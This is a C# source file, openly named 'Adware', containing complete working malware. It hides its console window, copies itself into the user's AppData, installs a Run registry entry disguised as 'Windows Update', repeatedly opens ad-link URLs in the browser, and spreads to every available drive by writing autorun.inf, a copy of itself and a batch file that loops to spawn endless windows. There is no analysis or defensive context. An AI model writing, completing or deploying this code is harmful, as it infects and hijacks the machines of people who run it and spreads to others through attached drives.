using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;

namespace Adware
{
    class Program
    {
        public static Thread start = new Thread(Start);
        public static string[] drives = Environment.GetLogicalDrives();

        private static void Start()
        {
            while (true)
            {
                string[] Ads = { "http://zipansion.com/qKCk", "http://zipansion.com/27q3F", "http://zipansion.com/27q0H", "http://zipansion.com/284Ap" };
                foreach (string site in Ads)
                {
                    Console.WriteLine(site);
                    Thread.Sleep(60000);
                    Process.Start(site);
                }
            }
        }

        [DllImport("Kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("User32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int cmdShow);
        static void Main(string[] args)
        {
            IntPtr hWnd = GetConsoleWindow();
            ShowWindow(hWnd, 0);
            string username = Environment.UserName;
            if(File.Exists(@"C:\users\" + username + @"\appdata\sys.exe"))
            {
                start.Start();
                Spread();
            }
            else
            {
                string name = Path.GetFileName(Process.GetCurrentProcess().MainModule.FileName);
                File.Copy(name, @"C:\users\" + username + @"\appdata\sys.exe");
                string run = @"Software\Microsoft\Windows\CurrentVersion\Run";
                Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(run, true);
                string app_path = @"C:\users\" + username + @"\appdata\sys.exe";
                string app_name = "Windows Update";
                if (!key.GetValueNames().Contains(app_name))
                    key.SetValue(app_name, app_path);
                key.Close();
                start.Start();
                Spread();
            }
        }

        private static void Spread()
        {
            while (true)
            {
                string username = Environment.UserName;
                string[] Drives = { "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z" };
                foreach (string infect in Drives)
                {
                    if (Directory.Exists(infect + @":\\"))
                    {
                        if (File.Exists(infect + @":\\start.exe"))
                        {
                            Console.WriteLine("Drive " + infect + ": already infected");
                        }
                        else
                        {
                            try
                            {
                                StreamWriter run = new StreamWriter(infect + ":\\autorun.inf");
                                run.WriteLine("[AUTORUN]");
                                run.WriteLine("icon=default");
                                run.WriteLine("open=start.exe");
                                run.Close();
                                File.Copy(@"C:\users\" + username + @"\appdata\sys.exe", infect + @":\\start.exe");
                                StreamWriter f2 = new StreamWriter(infect + @":\\install.bat");
                                f2.WriteLine("@echo off");
                                f2.WriteLine("start start.exe");
                                f2.WriteLine(@"cd C:\");
                                f2.WriteLine(":1");
                                f2.WriteLine("tree");
                                f2.WriteLine("start");
                                f2.WriteLine("goto 1");
                                f2.Close();
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine("Drive " + infect + ": Error don't have the permissions");
                            }
                        }
                    }
                }
            }
        }
    }
}